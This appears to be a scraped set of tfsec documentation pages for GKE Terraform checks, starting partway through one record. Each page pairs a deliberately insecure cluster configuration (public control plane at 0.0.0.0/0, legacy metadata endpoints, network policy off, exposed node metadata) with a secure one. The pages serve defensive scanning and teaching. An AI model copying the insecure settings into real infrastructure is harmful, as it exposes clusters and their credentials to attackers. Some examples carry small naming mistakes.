node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#ip_allocation_policy](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#ip_allocation_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:10.614570"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/enable-master-networks/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/enable-master-networks/index.md", "content": "---\ntitle: Master authorized networks should be configured on GKE clusters\n---\n\n# Master authorized networks should be configured on GKE clusters\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nEnabling authorized networks means you can restrict master access to a fixed set of CIDR ranges\n\n### Possible Impact\nUnrestricted network access to the master\n\n### Suggested Resolution\nEnable master authorized networks\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-enable-master-networks check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-enable-master-networks check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   master_authorized_networks_config {\n     cidr_blocks {\n       cidr_block = \"10.10.128.0/24\"\n       display_name = \"internal\"\n     }\n   }\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:10.903331"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/enable-network-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/enable-network-policy/index.md", "content": "---\ntitle: Network Policy should be enabled on GKE clusters\n---\n\n# Network Policy should be enabled on GKE clusters\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nEnabling a network policy allows the segregation of network traffic by namespace\n\n### Possible Impact\nUnrestricted inter-cluster communication\n\n### Suggested Resolution\nEnable network policy\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-enable-network-policy check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   network_policy {\n     enabled = false\n   }\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-enable-network-policy check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   network_policy {\n     enabled = true\n   }\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enabled](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:11.183524"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/enable-private-cluster/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/enable-private-cluster/index.md", "content": "---\ntitle: Clusters should be set to private\n---\n\n# Clusters should be set to private\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nEnabling private nodes on a cluster ensures the nodes are only available internally as they will only be assigned internal addresses.\n\n### Possible Impact\nNodes may be exposed to the public internet\n\n### Suggested Resolution\nEnable private cluster\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-enable-private-cluster check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   private_cluster_config {\n     enable_private_nodes = false\n   }\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-enable-private-cluster check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   private_cluster_config {\n     enable_private_nodes = true\n   }\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_private_nodes](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_private_nodes){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:11.469690"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/enable-stackdriver-logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/enable-stackdriver-logging/index.md", "content": "---\ntitle: Stackdriver Logging should be enabled\n---\n\n# Stackdriver Logging should be enabled\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nStackDriver logging provides a useful interface to all of stdout/stderr for each container and should be enabled for moitoring, debugging, etc.\n\n### Possible Impact\nVisibility will be reduced\n\n### Suggested Resolution\nEnable StackDriver logging\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-enable-stackdriver-logging check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   logging_service = \"logging.googleapis.com\"\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-enable-stackdriver-logging check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   logging_service = \"logging.googleapis.com/kubernetes\"\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#logging_service](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#logging_service){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:11.743444"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/enable-stackdriver-monitoring/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/enable-stackdriver-monitoring/index.md", "content": "---\ntitle: Stackdriver Monitoring should be enabled\n---\n\n# Stackdriver Monitoring should be enabled\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nStackDriver monitoring aggregates logs, events, and metrics from your Kubernetes environment on GKE to help you understand your application's behavior in production.\n\n### Possible Impact\nVisibility will be reduced\n\n### Suggested Resolution\nEnable StackDriver monitoring\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-enable-stackdriver-monitoring check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   monitoring_service = \"monitoring.googleapis.com\"\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-enable-stackdriver-monitoring check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   monitoring_service = \"monitoring.googleapis.com/kubernetes\"\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#monitoring_service](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#monitoring_service){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:12.044220"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/enforce-pod-security-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/enforce-pod-security-policy/index.md", "content": "---\ntitle: Pod security policy enforcement not defined.\n---\n\n# Pod security policy enforcement not defined.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nBy default, Pods in Kubernetes can operate with capabilities beyond what they require. You should constrain the Pod's capabilities to only those required for that workload.\n\nKubernetes offers controls for restricting your Pods to execute with only explicitly granted capabilities. \n\nPod Security Policy allows you to set smart defaults for your Pods, and enforce controls you want to enable across your fleet. \n\nThe policies you define should be specific to the needs of your application\n\n### Possible Impact\nPods could be operating with more permissions than required to be effective\n\n### Suggested Resolution\nUse security policies for pods to restrict permissions to those needed to be effective\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-enforce-pod-security-policy check.\n```terraform\n\n resource \"google_container_cluster\" \"bad_example\" {\n \tpod_security_policy_config {\n         enabled = \"false\"\n \t}\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-enforce-pod-security-policy check.\n```terraform\n\n resource \"google_container_cluster\" \"good_example\" {\n \tpod_security_policy_config {\n         enabled = \"true\"\n \t}\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#pod_security_policy_config](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#pod_security_policy_config){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#admission_controllers](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#admission_controllers){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:12.428498"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/index.md", "content": "---\ntitle: gke\n---\n\n# gke\n\n## Checks\n\n\n- [enable-auto-repair](enable-auto-repair) Kubernetes should have 'Automatic repair' enabled\n\n- [enable-auto-upgrade](enable-auto-upgrade) Kubernetes should have 'Automatic upgrade' enabled\n\n- [enable-ip-aliasing](enable-ip-aliasing) Clusters should have IP aliasing enabled\n\n- [enable-master-networks](enable-master-networks) Master authorized networks should be configured on GKE clusters\n\n- [enable-network-policy](enable-network-policy) Network Policy should be enabled on GKE clusters\n\n- [enable-private-cluster](enable-private-cluster) Clusters should be set to private\n\n- [enable-stackdriver-logging](enable-stackdriver-logging) Stackdriver Logging should be enabled\n\n- [enable-stackdriver-monitoring](enable-stackdriver-monitoring) Stackdriver Monitoring should be enabled\n\n- [enforce-pod-security-policy](enforce-pod-security-policy) Pod security policy enforcement not defined.\n\n- [metadata-endpoints-disabled](metadata-endpoints-disabled) Legacy metadata endpoints enabled.\n\n- [no-legacy-authentication](no-legacy-authentication) Legacy client authentication methods utilized.\n\n- [no-public-control-plane](no-public-control-plane) GKE Control Plane should not be publicly accessible\n\n- [node-metadata-security](node-metadata-security) Node metadata value disables metadata concealment.\n\n- [node-pool-uses-cos](node-pool-uses-cos) Ensure Container-Optimized OS (cos) is used for Kubernetes Engine Clusters Node image\n\n- [node-shielding-enabled](node-shielding-enabled) Shielded GKE nodes not enabled.\n\n- [use-cluster-labels](use-cluster-labels) Clusters should be configured with Labels\n\n- [use-rbac-permissions](use-rbac-permissions) Legacy ABAC permissions are enabled.\n\n- [use-service-account](use-service-account) Checks for service account defined for GKE nodes\n\n\n\n", "timestamp": "2025-10-24T22:25:12.649945"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/metadata-endpoints-disabled/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/metadata-endpoints-disabled/index.md", "content": "---\ntitle: Legacy metadata endpoints enabled.\n---\n\n# Legacy metadata endpoints enabled.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nThe Compute Engine instance metadata server exposes legacy v0.1 and v1beta1 endpoints, which do not enforce metadata query headers. \n\nThis is a feature in the v1 APIs that makes it more difficult for a potential attacker to retrieve instance metadata. \n\nUnless specifically required, we recommend you disable these legacy APIs.\n\nWhen setting the <code>metadata</code> block, the default value for <code>disable-legacy-endpoints</code> is set to true, they should not be explicitly enabled.\n\n### Possible Impact\nLegacy metadata endpoints don't require metadata headers\n\n### Suggested Resolution\nDisable legacy metadata endpoints\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-metadata-endpoints-disabled check.\n```terraform\n\n resource \"google_container_cluster\" \"bad_example\" {\n    node_config {\n      metadata = {\n        disable-legacy-endpoints = false\n      }\n    }\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-metadata-endpoints-disabled check.\n```terraform\n\n resource \"google_container_cluster\" \"good_example\" {\n    node_config {\n      metadata = {\n        disable-legacy-endpoints = true\n      }\n    }\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#metadata](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#metadata){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#protect_node_metadata_default_for_112](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#protect_node_metadata_default_for_112){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:12.923342"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/no-legacy-authentication/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/no-legacy-authentication/index.md", "content": "---\ntitle: Legacy client authentication methods utilized.\n---\n\n# Legacy client authentication methods utilized.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nIt is recommended to use Service Accounts and OAuth as authentication methods for accessing the master in the container cluster. \n\nBasic authentication should be disabled by explicitly unsetting the <code>username</code> and <code>password</code> on the <code>master_auth</code> block.\n\n### Possible Impact\nUsername/password or certificate authentication methods are less secure\n\n### Suggested Resolution\nUse service account or OAuth for authentication\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-no-legacy-authentication check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   master_auth {\n     client_certificate_config {\n       issue_client_certificate = true\n     }\n   }\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-no-legacy-authentication check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#master_auth](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#master_auth){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#restrict_authn_methods](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#restrict_authn_methods){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:13.295229"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/no-public-control-plane/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/no-public-control-plane/index.md", "content": "---\ntitle: GKE Control Plane should not be publicly accessible\n---\n\n# GKE Control Plane should not be publicly accessible\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nThe GKE control plane is exposed to the public internet by default.\n\n### Possible Impact\nGKE control plane exposed to public internet\n\n### Suggested Resolution\nUse private nodes and master authorised networks to prevent exposure\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-no-public-control-plane check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   master_authorized_networks_config {\n     cidr_blocks {\n       cidr_block = \"0.0.0.0/0\"\n       display_name = \"external\"\n     }\n   }\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-no-public-control-plane check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   master_authorized_networks_config {\n     cidr_blocks {\n       cidr_block = \"10.10.128.0/24\"\n       display_name = \"internal\"\n     }\n   }\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:13.698155"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/node-metadata-security/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/node-metadata-security/index.md", "content": "---\ntitle: Node metadata value disables metadata concealment.\n---\n\n# Node metadata value disables metadata concealment.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nIf the <code>workload_metadata_config</code> block within <code>node_config</code> is included, the <code>node_metadata</code> attribute should be configured securely.\n\nThe attribute should be set to <code>SECURE</code> to use metadata concealment, or <code>GKE_METADATA_SERVER</code> if workload identity is enabled. This ensures that the VM metadata is not unnecessarily exposed to pods.\n\n### Possible Impact\nMetadata that isn't concealed potentially risks leakage of sensitive data\n\n### Suggested Resolution\nSet node metadata to SECURE or GKE_METADATA_SERVER\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-node-metadata-security check.\n```terraform\n\n resource \"google_container_node_pool\" \"bad_example\" {\n \tnode_config {\n \t\tworkload_metadata_config {\n \t\t\tnode_metadata = \"EXPOSE\"\n \t\t}\n \t}\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-node-metadata-security check.\n```terraform\n\n resource \"google_container_node_pool\" \"good_example\" {\n \tnode_config {\n \t\tworkload_metadata_config {\n \t\t\tnode_metadata = \"SECURE\"\n \t\t}\n \t}\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#node_metadata](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#node_metadata){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/kubernetes-engine/docs/how-to/protecting-cluster-metadata#create-concealed](https://cloud.google.com/kubernetes-engine/docs/how-to/protecting-cluster-metadata#create-concealed){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:14.060171"}
